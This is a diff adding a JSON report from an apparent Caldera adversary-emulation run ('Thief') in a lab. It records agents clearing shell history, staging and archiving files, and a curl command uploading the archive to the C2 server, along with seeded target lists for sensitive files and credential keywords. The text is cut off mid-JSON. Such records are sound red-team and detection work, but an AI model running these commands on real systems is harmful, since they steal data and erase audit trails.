@@ -1,0 +1,1053 @@
+{
+  "name": "Lupin-Thief",
+  "host_group": [
+    {
+      "last_seen": "2023-05-05T15:55:06Z",
+      "display_name": "caldera-target$ubuntu",
+      "contact": "HTTP",
+      "links": [
+        {
+          "pin": 0,
+          "score": 0,
+          "host": "caldera-target",
+          "unique": "4cdef352-d48e-4cf1-a84c-798be6c483a0",
+          "output": "False",
+          "id": "4cdef352-d48e-4cf1-a84c-798be6c483a0",
+          "finish": "2023-05-05T15:50:17Z",
+          "ability": {
+            "executors": [
+              {
+                "parsers": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "additional_info": {},
+                "platform": "darwin",
+                "name": "sh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              },
+              {
+                "parsers": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "additional_info": {},
+                "platform": "linux",
+                "name": "sh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              },
+              {
+                "parsers": [],
+                "command": "Clear-History;Clear",
+                "additional_info": {},
+                "platform": "windows",
+                "name": "psh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              }
+            ],
+            "technique_id": "T1070.003",
+            "repeatable": false,
+            "additional_info": {},
+            "access": {},
+            "privilege": null,
+            "singleton": false,
+            "plugin": "stockpile",
+            "name": "Avoid logs",
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "delete_payload": true,
+            "description": "Stop terminal from logging history",
+            "tactic": "defense-evasion",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "requirements": []
+          },
+          "pid": "65150",
+          "facts": [],
+          "used": [],
+          "collect": "2023-05-05T15:50:17Z",
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "status": 0,
+          "decide": "2023-05-05T15:50:17Z",
+          "executor": {
+            "parsers": [],
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "additional_info": {},
+            "platform": "linux",
+            "name": "sh",
+            "language": null,
+            "cleanup": [],
+            "code": null,
+            "timeout": 60,
+            "build_target": null,
+            "payloads": [],
+            "variations": [],
+            "uploads": []
+          },
+          "paw": "qtsxfp",
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "deadman": false,
+          "relationships": [],
+          "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "agent_reported_time": "2023-05-05T15:50:17Z",
+          "cleanup": 0,
+          "jitter": 0
+        }
+      ],
+      "exe_name": "sandcat.go-linux",
+      "watchdog": 0,
+      "host": "caldera-target",
+      "origin_link_id": "",
+      "server": "http://10.1.62.239:8888",
+      "sleep_max": 60,
+      "upstream_dest": "http://10.1.62.239:8888",
+      "architecture": "amd64",
+      "pending_contact": "HTTP",
+      "pid": 64436,
+      "available_contacts": [
+        "HTTP"
+      ],
+      "sleep_min": 30,
+      "executors": [
+        "proc",
+        "sh"
+      ],
+      "ppid": 64405,
+      "proxy_chain": [],
+      "platform": "linux",
+      "privilege": "User",
+      "deadman_enabled": true,
+      "created": "2023-05-05T15:50:17Z",
+      "username": "ubuntu",
+      "proxy_receivers": {},
+      "group": "red",
+      "paw": "qtsxfp",
+      "host_ip_addrs": [
+        "10.1.62.67",
+        "172.17.0.1"
+      ],
+      "trusted": true,
+      "location": "/home/ubuntu/sandcat.go-linux"
+    },
+    {
+      "last_seen": "2023-05-05T15:55:10Z",
+      "display_name": "caldera-target$ubuntu",
+      "contact": "HTTP",
+      "links": [
+        {
+          "pin": 0,
+          "score": 0,
+          "host": "caldera-target",
+          "unique": "5d7f46c1-89b6-490c-8466-6ef50c01d784",
+          "output": "False",
+          "id": "5d7f46c1-89b6-490c-8466-6ef50c01d784",
+          "finish": "2023-05-05T15:50:45Z",
+          "ability": {
+            "executors": [
+              {
+                "parsers": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "additional_info": {},
+                "platform": "darwin",
+                "name": "sh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              },
+              {
+                "parsers": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "additional_info": {},
+                "platform": "linux",
+                "name": "sh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              },
+              {
+                "parsers": [],
+                "command": "Clear-History;Clear",
+                "additional_info": {},
+                "platform": "windows",
+                "name": "psh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              }
+            ],
+            "technique_id": "T1070.003",
+            "repeatable": false,
+            "additional_info": {},
+            "access": {},
+            "privilege": null,
+            "singleton": false,
+            "plugin": "stockpile",
+            "name": "Avoid logs",
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "delete_payload": true,
+            "description": "Stop terminal from logging history",
+            "tactic": "defense-evasion",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "requirements": []
+          },
+          "pid": "65164",
+          "facts": [],
+          "used": [],
+          "collect": "2023-05-05T15:50:45Z",
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "status": 0,
+          "decide": "2023-05-05T15:50:45Z",
+          "executor": {
+            "parsers": [],
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "additional_info": {},
+            "platform": "linux",
+            "name": "sh",
+            "language": null,
+            "cleanup": [],
+            "code": null,
+            "timeout": 60,
+            "build_target": null,
+            "payloads": [],
+            "variations": [],
+            "uploads": []
+          },
+          "paw": "jcwdsq",
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "deadman": false,
+          "relationships": [],
+          "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "agent_reported_time": "2023-05-05T15:50:45Z",
+          "cleanup": 0,
+          "jitter": 0
+        }
+      ],
+      "exe_name": "caldera",
+      "watchdog": 0,
+      "host": "caldera-target",
+      "origin_link_id": "",
+      "server": "http://10.1.62.239:8888",
+      "sleep_max": 60,
+      "upstream_dest": "http://10.1.62.239:8888",
+      "architecture": "amd64",
+      "pending_contact": "HTTP",
+      "pid": 65153,
+      "available_contacts": [
+        "HTTP"
+      ],
+      "sleep_min": 30,
+      "executors": [
+        "proc",
+        "sh"
+      ],
+      "ppid": 65125,
+      "proxy_chain": [],
+      "platform": "linux",
+      "privilege": "User",
+      "deadman_enabled": true,
+      "created": "2023-05-05T15:50:45Z",
+      "username": "ubuntu",
+      "proxy_receivers": {},
+      "group": "red",
+      "paw": "jcwdsq",
+      "host_ip_addrs": [
+        "10.1.62.67",
+        "172.17.0.1"
+      ],
+      "trusted": true,
+      "location": "/home/ubuntu/caldera"
+    },
+    {
+      "last_seen": "2023-05-05T15:55:25Z",
+      "display_name": "caldera-target$ubuntu",
+      "contact": "HTTP",
+      "links": [
+        {
+          "pin": 0,
+          "score": 0,
+          "host": "caldera-target",
+          "unique": "e1f4be22-9f3c-468c-b4f1-2b336fa0bde2",
+          "output": "False",
+          "id": "e1f4be22-9f3c-468c-b4f1-2b336fa0bde2",
+          "finish": "2023-05-05T15:51:43Z",
+          "ability": {
+            "executors": [
+              {
+                "parsers": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "additional_info": {},
+                "platform": "darwin",
+                "name": "sh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              },
+              {
+                "parsers": [],
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "additional_info": {},
+                "platform": "linux",
+                "name": "sh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              },
+              {
+                "parsers": [],
+                "command": "Clear-History;Clear",
+                "additional_info": {},
+                "platform": "windows",
+                "name": "psh",
+                "language": null,
+                "cleanup": [],
+                "code": null,
+                "timeout": 60,
+                "build_target": null,
+                "payloads": [],
+                "variations": [],
+                "uploads": []
+              }
+            ],
+            "technique_id": "T1070.003",
+            "repeatable": false,
+            "additional_info": {},
+            "access": {},
+            "privilege": null,
+            "singleton": false,
+            "plugin": "stockpile",
+            "name": "Avoid logs",
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "delete_payload": true,
+            "description": "Stop terminal from logging history",
+            "tactic": "defense-evasion",
+            "buckets": [
+              "defense-evasion"
+            ],
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "requirements": []
+          },
+          "pid": "65219",
+          "facts": [],
+          "used": [],
+          "collect": "2023-05-05T15:51:43Z",
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "status": 0,
+          "decide": "2023-05-05T15:51:43Z",
+          "executor": {
+            "parsers": [],
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "additional_info": {},
+            "platform": "linux",
+            "name": "sh",
+            "language": null,
+            "cleanup": [],
+            "code": null,
+            "timeout": 60,
+            "build_target": null,
+            "payloads": [],
+            "variations": [],
+            "uploads": []
+          },
+          "paw": "gnayxz",
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "deadman": false,
+          "relationships": [],
+          "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "agent_reported_time": "2023-05-05T15:51:43Z",
+          "cleanup": 0,
+          "jitter": 0
+        }
+      ],
+      "exe_name": "sandcat.go-linux",
+      "watchdog": 0,
+      "host": "caldera-target",
+      "origin_link_id": "",
+      "server": "http://10.1.62.239:8888",
+      "sleep_max": 60,
+      "upstream_dest": "http://10.1.62.239:8888",
+      "architecture": "amd64",
+      "pending_contact": "HTTP",
+      "pid": 65215,
+      "available_contacts": [
+        "HTTP"
+      ],
+      "sleep_min": 30,
+      "executors": [
+        "proc",
+        "sh"
+      ],
+      "ppid": 65185,
+      "proxy_chain": [],
+      "platform": "linux",
+      "privilege": "User",
+      "deadman_enabled": true,
+      "created": "2023-05-05T15:51:43Z",
+      "username": "ubuntu",
+      "proxy_receivers": {},
+      "group": "red",
+      "paw": "gnayxz",
+      "host_ip_addrs": [
+        "10.1.62.67",
+        "172.17.0.1"
+      ],
+      "trusted": true,
+      "location": "/home/ubuntu/sandcat.go-linux"
+    }
+  ],
+  "start": "2023-05-05T15:53:06Z",
+  "steps": {
+    "qtsxfp": {
+      "steps": [
+        {
+          "link_id": "6cd5466d-2fcb-4443-80f4-45edb1c897d4",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "mkdir -p staged && echo $PWD/staged",
+          "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+          "delegated": "2023-05-05T15:53:07Z",
+          "run": "2023-05-05T15:53:25Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65224,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "output": {
+            "stdout": "/home/ubuntu/staged",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:53:25Z"
+        },
+        {
+          "link_id": "54adb4e8-ca08-47eb-86d3-edd1a7688980",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+          "plaintext_command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+          "delegated": "2023-05-05T15:53:42Z",
+          "run": "2023-05-05T15:54:02Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65228,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "output": {
+            "stdout": "/home/ubuntu/staged.tar.gz",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:54:02Z"
+        },
+        {
+          "link_id": "e867a066-58dc-4099-8e68-ef123cb1f2ae",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-qtsxfp\" http://10.1.62.239:8888/file/upload",
+          "plaintext_command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-qtsxfp\" http://10.1.62.239:8888/file/upload",
+          "delegated": "2023-05-05T15:54:42Z",
+          "run": "2023-05-05T15:55:06Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65254,
+          "description": "Exfil the staged directory",
+          "name": "Exfil staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "technique_id": "T1041"
+          },
+          "output": {
+            "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   331    0     0  100   331      0   111k --:--:-- --:--:-- --:--:--  161k",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:55:06Z"
+        }
+      ]
+    },
+    "jcwdsq": {
+      "steps": [
+        {
+          "link_id": "efe2b34d-b03c-4b45-a162-835edd40aab9",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "mkdir -p staged && echo $PWD/staged",
+          "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+          "delegated": "2023-05-05T15:53:07Z",
+          "run": "2023-05-05T15:53:17Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65220,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "output": {
+            "stdout": "/home/ubuntu/staged",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:53:17Z"
+        },
+        {
+          "link_id": "a8bd63e7-4b3f-497e-be50-785e9206b9db",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+          "plaintext_command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+          "delegated": "2023-05-05T15:53:42Z",
+          "run": "2023-05-05T15:54:10Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65239,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "output": {
+            "stdout": "/home/ubuntu/staged.tar.gz",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:54:10Z"
+        },
+        {
+          "link_id": "b9880eaa-6851-4d30-b9a9-7d3033771fcf",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-jcwdsq\" http://10.1.62.239:8888/file/upload",
+          "plaintext_command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-jcwdsq\" http://10.1.62.239:8888/file/upload",
+          "delegated": "2023-05-05T15:54:42Z",
+          "run": "2023-05-05T15:55:10Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65257,
+          "description": "Exfil the staged directory",
+          "name": "Exfil staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "technique_id": "T1041"
+          },
+          "output": {
+            "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   331    0     0  100   331      0   150k --:--:-- --:--:-- --:--:--  323k",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:55:10Z"
+        }
+      ]
+    },
+    "gnayxz": {
+      "steps": [
+        {
+          "link_id": "26953fe7-ea0b-4c4d-b43f-ebe4017d7b9f",
+          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+          "command": "mkdir -p staged && echo $PWD/staged",
+          "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+          "delegated": "2023-05-05T15:53:07Z",
+          "run": "2023-05-05T15:53:39Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65226,
+          "description": "create a directory for exfil staging",
+          "name": "Create staging directory",
+          "attack": {
+            "tactic": "collection",
+            "technique_name": "Data Staged: Local Data Staging",
+            "technique_id": "T1074.001"
+          },
+          "output": {
+            "stdout": "/home/ubuntu/staged",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:53:39Z"
+        },
+        {
+          "link_id": "303e8999-093c-4309-92a1-196f92863c7e",
+          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+          "command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+          "plaintext_command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+          "delegated": "2023-05-05T15:53:42Z",
+          "run": "2023-05-05T15:54:37Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65243,
+          "description": "Compress a directory on the file system",
+          "name": "Compress staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Archive Collected Data: Archive via Utility",
+            "technique_id": "T1560.001"
+          },
+          "output": {
+            "stdout": "/home/ubuntu/staged.tar.gz",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:54:37Z"
+        },
+        {
+          "link_id": "8d1b24ab-da6e-42cb-9302-2de41a291227",
+          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+          "command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-gnayxz\" http://10.1.62.239:8888/file/upload",
+          "plaintext_command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-gnayxz\" http://10.1.62.239:8888/file/upload",
+          "delegated": "2023-05-05T15:54:42Z",
+          "run": "2023-05-05T15:55:25Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 65260,
+          "description": "Exfil the staged directory",
+          "name": "Exfil staged directory",
+          "attack": {
+            "tactic": "exfiltration",
+            "technique_name": "Exfiltration Over C2 Channel",
+            "technique_id": "T1041"
+          },
+          "output": {
+            "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   331    0     0  100   331      0  78158 --:--:-- --:--:-- --:--:-- 82750",
+            "stderr": "",
+            "exit_code": ""
+          },
+          "agent_reported_time": "2023-05-05T15:55:25Z"
+        }
+      ]
+    }
+  },
+  "finish": null,
+  "planner": "atomic",
+  "adversary": {
+    "plugin": "stockpile",
+    "name": "Thief",
+    "tags": [],
+    "adversary_id": "1a98b8e6-18ce-4617-8cc5-e65a1a9d490e",
+    "description": "An adversary to steal sensitive files",
+    "atomic_ordering": [
+      "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
+      "4e97e699-93d7-4040-b5a3-2e906a58199e",
+      "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+      "ea713bc4-63f0-491c-9a6f-0b01d560b87e"
+    ],
+    "has_repeatable_abilities": false,
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc"
+  },
+  "jitter": "2/8",
+  "objectives": {
+    "name": "default",
+    "percentage": 0,
+    "description": "This is a default objective that runs forever.",
+    "goals": [
+      {
+        "target": "exhaustion",
+        "operator": "==",
+        "achieved": false,
+        "count": 1048576,
+        "value": "complete"
+      }
+    ],
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc"
+  },
+  "facts": [
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "linux.included.extensions",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "linux.included.extensionstxt,cfg,conf,yml,doc,docx,xls,xlsx,pdf,sh,jpg,p7b,p7s,p7r,p12,pfx",
+      "value": "txt,cfg,conf,yml,doc,docx,xls,xlsx,pdf,sh,jpg,p7b,p7s,p7r,p12,pfx",
+      "trait": "linux.included.extensions",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "windows.included.extensions",
+      "score": 1,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "windows.included.extensionsdoc,xps,xls,ppt,pps,wps,wpd,ods,odt,lwp,jtd,pdf,zip,rar,docx,url,xlsx,pptx,ppsx,pst,ost,jpg,txt,lnk,p7b,p7s,p7r,p12,pfx",
+      "value": "doc,xps,xls,ppt,pps,wps,wpd,ods,odt,lwp,jtd,pdf,zip,rar,docx,url,xlsx,pptx,ppsx,pst,ost,jpg,txt,lnk,p7b,p7s,p7r,p12,pfx",
+      "trait": "windows.included.extensions",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "windows.excluded.extensions",
+      "score": 1,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "windows.excluded.extensionsexe,jar,dll,msi,bak,vmx,vmdx,vmdk,lck",
+      "value": "exe,jar,dll,msi,bak,vmx,vmdx,vmdk,lck",
+      "trait": "windows.excluded.extensions",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "file.sensitive.content",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "file.sensitive.contentuser,pass,username,password,uname,psw",
+      "value": "user,pass,username,password,uname,psw",
+      "trait": "file.sensitive.content",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "file.last.accessed",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "file.last.accessed-30",
+      "value": "-30",
+      "trait": "file.last.accessed",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "file.last.modified",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "file.last.modified-30",
+      "value": "-30",
+      "trait": "file.last.modified",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "windows.included.directories",
+      "score": 1,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "windows.included.directoriesc:\\users",
+      "value": "c:\\users",
+      "trait": "windows.included.directories",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "linux.included.directories",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "linux.included.directories/home",
+      "value": "/home",
+      "trait": "linux.included.directories",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "windows.excluded.directories",
+      "score": 1,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "windows.excluded.directorieslinks,music,saved games,contacts,videos,source,onedrive",
+      "value": "links,music,saved games,contacts,videos,source,onedrive",
+      "trait": "windows.excluded.directories",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "linux.excluded.directories",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "linux.excluded.directories.local,.cache,lib,caldera",
+      "value": ".local,.cache,lib,caldera",
+      "trait": "linux.excluded.directories",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "windows.staging.location",
+      "score": 1,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "windows.staging.locationRecycle Bin",
+      "value": "Recycle Bin",
+      "trait": "windows.staging.location",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "linux.staging.location",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "linux.staging.location/tmp",
+      "value": "/tmp",
+      "trait": "linux.staging.location",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "safe.mode.enabled",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "safe.mode.enabledFalse",
+      "value": "False",
+      "trait": "safe.mode.enabled",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "pseudo.data.identifier",
+      "score": 3,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "pseudo.data.identifier_pseudo",
+      "value": "_pseudo",
+      "trait": "pseudo.data.identifier",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "",
+      "relationships": [],
+      "created": "2023-05-05T10:33:46Z",
+      "limit_count": -1,
+      "name": "host.archive.password",
+      "score": 1,
+      "source": "2ccb822c-088a-4664-8976-91be8879bc1d",
+      "links": [],
+      "collected_by": [],
+      "unique": "host.archive.passwordC4ld3ra",
+      "value": "C4ld3ra",
+      "trait": "host.archive.password",
+      "origin_type": "SEEDED"
+    },
+    {
+      "technique_id": "T1074.001",
+      "relationships": [
+        "host.dir.staged(/home/ubuntu/staged)"
+      ],
+      "created": "2023-05-05T15:53:17Z",
+      "limit_count": -1,
+      "name": "host.dir.staged",
+      "score": 4,
+      "source": "a0b17e15-73c4-4770-a157-ad270c2b8c32",
+      "links": [
+        "efe2b34d-b03c-4b45-a162-835edd40aab9",
+        "6cd5466d-2fcb-4443-80f4-45edb1c897d4",
+        "26953fe7-ea0b-4c4d-b43f-ebe4017d7b9f"
+      ],
+      "collected_by": [
+        "jcwdsq",
+        "qtsxfp",
+        "gnayxz"
+      ],
+      "unique": "host.dir.staged/home/ubuntu/staged",
+      "value": "/home/ubuntu/staged",
+      "trait": "host.dir.staged",
+      "origin_type": "LEARNED"
+    },
+    {
+      "technique_id": "T1560.001",
+      "relationships": [
+        "host.dir.compress(/home/ubuntu/staged.tar.gz)"
+      ],
+      "created": "2023-05-05T15:54:02Z",
+      "limit_count": -1,
+      "name": "host.dir.compress",
+      "score": 1,
+      "source": "a0b17e15-73c4-4770-a157-ad270c2b8c32",
+      "links": [
+        "54adb4e8-ca08-47eb-86d3-edd1a7688980",
+        "a8bd63e7-4b3f-497e-be50-785e9206b9db",
+        "303e8999-093c-4309-92a1-196f92863c7e"
+      ],
+      "collected_by": [
